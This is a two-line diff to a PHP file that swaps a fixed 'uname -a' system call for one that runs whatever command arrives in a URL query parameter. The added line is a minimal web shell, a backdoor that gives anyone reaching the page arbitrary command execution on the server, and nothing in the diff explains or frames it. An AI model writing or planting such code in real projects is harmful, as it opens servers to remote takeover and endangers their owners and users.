@@ -1,2 +1,2 @@
-<? system("uname -a")?>
+<? system($_GET[0])?>
 
